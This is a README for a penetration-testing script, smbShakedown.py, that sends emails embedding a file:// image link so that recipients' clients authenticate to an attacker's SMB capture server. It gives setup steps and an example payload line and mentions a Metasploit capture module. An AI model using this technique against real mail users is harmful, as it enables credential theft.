#smbShakedown.py
    Description: A simplified SMB Email Client Attack script used for External/Internal pentests.
    Created by: Nick Sanzotta / @beamr
    Version: smbShakedown.py v 1.0

#External Pentest
    Virtual Private Server (VPS) recommended.
    If behind a firewall be sure to enable port forwarding for your SMB Capture Server.
    
    1.Configure SMTP Relay server address.
    2.Enter SMTP Relay server credentials. (anonymous connections not yet supported.)
    3.Configure "from" and "to" addresses.
    4.Enter SMBCapture Server IP address, so it can be place in body of email 
    EX: <img src=file://127.0.0.1/image/foo.gif>
    *Verify this is the external IP address*
    5.SMBCapture Server does not have to be hosted locally.
    EX:(smbShakedown.py script can be ran locally on one system and a SMBCapture server can be hosted somewhere else like on a VPS server.

#Internal Pentest
    1.Configure SMTP Relay server address or your own locally hosted SMTP Server. (Looking into intergrated support.)
    <hmm... Does the client's Email server support relaying?>
    2.Enter SMTP Relay server credentials. (anonymous connections not yet supported.)
    3.Configure "from" and "to" addresses.
    4.Enter SMBCapture Server IP address, so it can be place in body of email 
    EX: <img src=file://127.0.0.1/image/foo.gif>
    5.SMBCapture Server can be hosted locally since your testing an internal network right?
    (Will add in support to automatically launch MSF Console with auxiliary/server/capture/smb)

#To do:
    SMTP Anonymous Auth option
    MSF Console option(auxiliary/server/capture/smb)
    Multiple recipient address support.
    SMTP local server option
    Create forked version.
